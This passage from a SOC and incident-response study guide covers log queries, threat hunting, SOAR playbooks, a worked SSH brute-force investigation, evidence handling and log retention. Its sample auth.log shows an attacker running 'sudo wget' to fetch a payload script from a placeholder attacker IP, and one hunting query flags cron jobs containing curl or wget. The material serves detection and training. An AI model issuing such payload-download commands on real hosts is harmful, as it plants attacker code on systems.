> **Performance note:** the SPL `transaction` command is resource-intensive on large datasets (it holds the state of each event group in memory); **[PROD]** production should use `stats` grouped by field instead of `transaction`:
>
> ```spl
> index=wineventlog (EventCode=4625 OR EventCode=4624)
> | stats count(eval(EventCode=4625)) as failed, count(eval(EventCode=4624)) as success,
>         min(_time) as first_seen, max(_time) as last_seen,
>         values(TargetUserName) as users by IpAddress
> | where failed > 20 AND success > 0
> ```

### 10.8.5. Velociraptor / osquery — querying endpoints for hunting

**osquery** lets you query endpoint state with SQL. Example finding a process listening on an unusual port:

```sql
SELECT p.name, p.pid, l.port, l.address
FROM listening_ports l
JOIN processes p ON l.pid = p.pid
WHERE l.port NOT IN (22, 80, 443, 3389);
```

Finding scheduled-task/cron persistence (Linux):

```sql
SELECT * FROM crontab WHERE command LIKE '%curl%' OR command LIKE '%wget%';
```

### 10.8.6. TheHive / SOAR — case management & automation

**What it is:** TheHive is an IR case management platform; Cortex runs "analyzers" (e.g. a VirusTotal hash lookup). SOAR (Security Orchestration, Automation and Response) runs automated playbooks.

Example SOAR playbook logic (pseudocode) for phishing:

```
on alert "phishing":
  observables = extract(email)         # sender, url, hash
  for each url in observables.urls:
     vt = VirusTotal.lookup(url)
     if vt.malicious >= 3:
         MailGateway.block(url)
         create_case(severity="high")
         M365.purge(subject=email.subject)
  notify_slack("#soc", summary)
```

**Security note:** automating destructive actions (block/purge/isolate) must have safeguards: only auto-execute with high confidence; high-risk actions need a human-in-the-loop to prevent an attacker abusing the SOAR for DoS (e.g. deliberately triggering it to auto-block a range of legitimate IPs).

---

## 10.9. Threat Hunting — hypotheses based on MITRE ATT&CK

### 10.9.1. Principle

Hunting is **proactively** searching for traces of an attacker that automated detection has NOT yet caught. Unlike triage (reacting to an alert), hunting begins from a **hypothesis**, usually based on a technique in **MITRE ATT&CK** (the Tactics × Techniques matrix, where each technique has a Txxxx code).

The hunt loop:

```
1. Hypothesis  -> "An attacker may be performing lateral movement via PsExec (T1021.002 / T1570)"
2. Data        -> Identify the data sources needed: Event 7045 (service install), 4624 LogonType 3,
                  network SMB 445, process create (4688) named psexesvc.
3. Hunt/Query  -> Run queries to find signs.
4. Triage      -> What was found? Analyze it.
5. Outcome     -> If found -> incident. If not -> create a new detection to automate the hunt.
```

### 10.9.2. A concrete hunt example — Lateral Movement via PsExec

**Hypothesis:** "An internal host is using PsExec to run commands remotely on another host."

**Distinctive byte/event signs of PsExec:**
- PsExec creates a **service named `PSEXESVC`** on the target machine → **Event 7045** with `Service Name = PSEXESVC` and the binary path `%SystemRoot%\PSEXESVC.exe`.
- A **Network (LogonType 3)** logon from the source host (Event 4624) immediately beforehand.
- An **SMB connection on port 445** from source to target; files written via the **ADMIN$ share**.
- A named pipe `\PSEXESVC` is created.

**Splunk query:**

```spl
index=wineventlog EventCode=7045 Service_Name="PSEXESVC"
| stats count by Computer, _time
| sort _time
```

Correlate with network logons:

```spl
index=wineventlog EventCode=4624 Logon_Type=3
| join Computer
  [ search index=wineventlog EventCode=7045 Service_Name="PSEXESVC" ]
| table _time, Computer, IpAddress, TargetUserName
```

**Subtle point:** the attacker can rename the service (PsExec supports `-r`); an advanced hunt looks for the **behavioral pattern** (a newly created service + a binary in an unusual path + run once then removed) rather than just the name `PSEXESVC`.

**MITRE mapping:** T1021.002 (SMB/Windows Admin Shares), T1570 (Lateral Tool Transfer), T1569.002 (Service Execution).

### 10.9.3. The "Pyramid of Pain" model

When creating IOCs/detections, prioritize the indicators that are hardest to evade:

```
            ▲ Hard for the attacker to change (high value)
   TTPs               <- Hardest, the best to hunt
   Tools
   Network/Host Artifacts
   Domain Names
   IP Addresses
   Hash Values        <- Easiest to change (low value)
            ▼
```

**Why:** a hash changes just by adding 1 byte; but behavior (TTP) reflects how the attacker operates, which is very costly to change. Hunting by TTP/behavior is more durable than hunting by static IOCs.

---

## 10.10. Worked example — analysis from start to finish

Scenario: **many failed logins followed by one successful login** on a Linux server with SSH exposed to the Internet (`auth-srv-01`, internal IP `10.0.0.5`).

### Step 0 — Raw log (`/var/log/auth.log`)

```
Jun 19 08:20:31 auth-srv-01 sshd[4801]: Failed password for invalid user admin from 203.0.113.45 port 50991 ssh2
Jun 19 08:20:33 auth-srv-01 sshd[4805]: Failed password for invalid user root from 203.0.113.45 port 50995 ssh2
Jun 19 08:20:35 auth-srv-01 sshd[4809]: Failed password for invalid user oracle from 203.0.113.45 port 51001 ssh2
... (hundreds of similar lines, ~3 per second) ...
Jun 19 08:24:58 auth-srv-01 sshd[5102]: Failed password for deploy from 203.0.113.45 port 52210 ssh2
Jun 19 08:25:01 auth-srv-01 sshd[5108]: Accepted password for deploy from 203.0.113.45 port 52240 ssh2
Jun 19 08:25:01 auth-srv-01 sshd[5108]: pam_unix(sshd:session): session opened for user deploy by (uid=0)
Jun 19 08:25:44 auth-srv-01 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.45/x.sh
```

### Step 1 — Detection
A Sigma/Suricata threshold (section 10.8) fires an alert "SSH brute force from 203.0.113.45". Tier 1 receives the alert.

### Step 2 — Triage (Tier 1)
- **Validation:** read the raw log, confirm ~400 failures within ~4.5 minutes from a single src → TP, not an FP/known scanner.
- **Severity pivot point:** the line `Accepted password for deploy` → **a success has occurred**. Raise severity from "brute-force attempt" to "credential compromise". Escalate to Tier 2 IMMEDIATELY.

Counting queries:

```bash
grep "Failed password" /var/log/auth.log | grep "203.0.113.45" | wc -l
# 412
grep "Accepted password" /var/log/auth.log | grep "203.0.113.45"
# Jun 19 08:25:01 ... Accepted password for deploy from 203.0.113.45 ...
```

### Step 3 — Analysis (Tier 2)
- **Timeline:** 08:20:31 spray begins → 08:25:01 success for user `deploy` → 08:25:44 runs `sudo wget http://203.0.113.45/x.sh` (downloading a payload, suspected second-stage).
- **Scope:** user `deploy` ran sudo → may have become root. Must treat this as **the entire host being compromised**.
- **Extracted IOCs:** IP `203.0.113.45`, target user `deploy`, payload URL `http://203.0.113.45/x.sh`.

### Step 4 — Containment (short-term)
```bash
# Isolate the host from the network but KEEP it running (preserve RAM)
sudo iptables -I INPUT 1 -s 203.0.113.45 -j DROP
sudo iptables -I OUTPUT 1 -d 203.0.113.45 -j DROP
# Or isolate fully via EDR network-isolate. Collect before cutting off entirely.
```
Collect volatile data before eradication:
```bash
ss -tnp        # open connections (look for a reverse shell to 203.0.113.45)
ps auxf        # process tree
sudo lsof -p <suspect_pid>
crontab -l; ls -la /etc/cron.*   # persistence
last; w        # login sessions
```

### Step 5 — Forensics & Chain of Custody
- Capture memory (e.g. `LiME`/`avml`) and a disk image before making changes.
- Compute the evidence hash and record the chain of custody (section 10.11).

### Step 6 — Eradication
- Reset the `deploy` password + all accounts; disable SSH password auth (switch to key-only).
- Find & remove the `x.sh` payload, backdoors, unusual cron entries, and unknown SSH keys in `~/.ssh/authorized_keys`.
- Because root privilege is suspected → **rebuild the host from a clean image** rather than cleaning in place.

### Step 7 — Recovery
- Restore services on the newly built host; place SSH behind a bastion/VPN; enable fail2ban + MFA; apply enhanced monitoring of 203.0.113.45 and of `deploy`'s behavior.

### Step 8 — Lessons Learned
- Why was SSH with password auth exposed directly to the Internet? Why did `deploy` have a weak password and no MFA? → Enforce a key-only policy, MFA, rate-limiting, and take SSH off the Internet. Add a "success immediately after a failure sequence" detection to shorten MTTD.

---

## 10.11. Chain of Custody & basic forensics

### 10.11.1. Chain of Custody

**What it is:** a record documenting who held the evidence, when, and what was done with it — so the evidence has legal value (proving it was not tampered with).

A chain-of-custody form template — each required field:

| Field | Meaning | Example |
|---|---|---|
| Evidence ID | Unique identifier | EV-2026-0619-001 |
| Description | Description of the evidence | Disk image of auth-srv-01, 500GB |
| Collected by | Person who collected it | Analyst A |
| Date/Time | Time (with timezone) | 2026-06-19 09:10 UTC |
| Hash (acquisition) | Hash at collection time | SHA-256: a1b2... |
| Method/Tool | Tool + version | dd / FTK Imager 4.7 |
| Custody log | The handoff chain (from → to, time, reason) | A → B, 10:00, for analysis |

### 10.11.2. The Order of Volatility principle (RFC 3227)

Collect in order from most easily lost to most durable:

```
1. CPU registers, cache
2. RAM (processes, network state, code not written to disk)
3. Network state (connections, ARP, routing table)
4. Running processes
5. Disk (file system)
6. Remote logging / monitoring data
7. Physical configuration, topology
8. External storage media (backups, ...)
```

**Why:** RAM is lost when power is removed; powering off immediately = losing the reverse shell, code running only in memory, and decryption keys. This is why, in the ransomware/brute-force playbooks, we **do not power off** the machine, only isolate the network.

### 10.11.3. Collection & integrity verification

```bash
# Create a read-only disk image and compute the hash at the same time
sudo dd if=/dev/sda bs=4M conv=noerror,sync status=progress | tee image.dd | sha256sum
# Save the hash
sha256sum image.dd > image.dd.sha256
# When verifying again later:
sha256sum -c image.dd.sha256
# image.dd: OK
```

**Why use a hash:** SHA-256 (a 256-bit/32-byte digest) lets you prove the image has not changed by a single bit since collection. One changed bit → the hash changes completely (avalanche effect). Use a hardware **write-blocker** to ensure evidence is not overwritten while reading it.

**Security/legal note:** a break in the chain of custody (a time gap, no hash, using an untrusted tool) renders evidence worthless in court. Forensics must be performed on a **copy** (image), never on the original drive.

---

## 10.12. Log Retention — storage policy and reasoning

### 10.12.1. Why retain logs for a long time

- **Dwell time:** the time an attacker hides in a network before being detected is typically measured in weeks to months (per industry reports such as Mandiant M-Trends — the specific figure varies by year, [needs verification against the latest report]). If you keep logs for only 30 days but the dwell time is 90 days → you have no logs from the moment of initial intrusion to investigate.
- **Compliance:** many frameworks require a minimum retention period. Common examples (verify against the current version):
  - PCI DSS: a minimum of 1 year of logs, with ≥ 3 months immediately available — [verify against the current PCI DSS version].
  - Many financial/healthcare regulations require several years.

### 10.12.2. Tiered storage model (hot/warm/cold)

| Tier | Duration | Characteristics | Purpose |
|---|---|---|---|
| Hot | 0–30 days | Fully indexed, fast queries, expensive | Detection & current investigations |
| Warm | 30–90 days | Partially indexed, slower | Investigation of recent incidents |
| Cold/Archive | 90 days–several years | Compressed, cheap storage (object storage), slow recovery | Compliance, old investigations, legal |

**Why tiering:** a hot index consumes CPU/RAM/disk; keeping everything hot is very expensive. Tiering balances cost against accessibility.

### 10.12.3. Protecting log integrity

- **Write-once / WORM** or append-only to prevent log modification/deletion (attackers always try to erase logs — Event 1102 is a sign of this).
- **Forward logs in real time** off the host (to the SIEM) so that if the host is compromised the logs still exist elsewhere.
- **Time sync (NTP)** across the entire infrastructure — without a unified time you cannot build a correlated multi-source timeline.

**Security note:** retention is not only about "how long to keep" but also "who can read it" — logs contain sensitive data (usernames, IPs, sometimes leaked credentials). Access control over the log store and at-rest encryption are mandatory.

---

## 10.13. Summary — tying the pieces together

SOC operations form a closed loop:

- **Operational loop:** preparation (logging, playbooks, tools) → detection (rules over normalized logs) → triage (Tier 1) → investigation (Tier 2) → response (containment/eradication/recovery, preserving evidence) → lessons → detection improvement.
- **Feedback from hunting:** threat hunting (Tier 3) feeds new findings back to enrich automated detection.
- **The common foundation of every step:**
  - **Reading logs correctly down to each field** — syslog PRI, Event ID/LogonType/Status, CEF extension.
  - **Measuring correctly** — clearly defined MTTD/MTTR.
  - **Handling evidence to standard** — order of volatility, chain of custody, integrity hashing.

The takeaway that ties it together:

- **Mastering the byte/field/step details** is the prerequisite for steady, reliable operations.
- Skipping them leaves blind spots — and an attacker exploits exactly those blind spots in your operations.


---

## My notes

> *Personal notes: points I previously misunderstood, areas I'm still exploring, or lessons from hands-on practice — updated over time.*
